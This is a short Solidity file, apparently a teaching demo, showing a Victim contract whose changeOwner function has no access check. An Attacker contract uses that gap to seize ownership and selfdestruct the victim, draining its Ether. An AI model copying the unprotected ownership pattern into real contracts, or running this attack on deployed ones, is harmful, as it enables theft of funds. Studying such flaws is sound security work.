//SPDX-License-Identifier: MIT
// Author: Yaghoub Adelzadeh
// GitHub: https://www.github.com/dappteacher
pragma solidity ^0.8.25;

contract Victim{
    address public owner;
    constructor(){
        owner = msg.sender;
    }
    function deposit()public payable {}

    // This function allows the owner to destroy contract 
    // and send the ramaining Ether to a specified address
    function destroyContract(address payable _to)public {
        require(msg.sender == owner,"Only owner can destroy the contract");
        selfdestruct(_to);
    } 

    function changeOwner(address _newOwner)public {
        owner = _newOwner;
    }   
    receive() external payable { }
}

contract Attacker{
    Victim public victim;
    constructor(address payable _victim){
        victim = Victim(_victim);
    }
    function attack()public {
        victim.changeOwner(address(this));
        victim.destroyContract(payable (address(this)));
    }
}
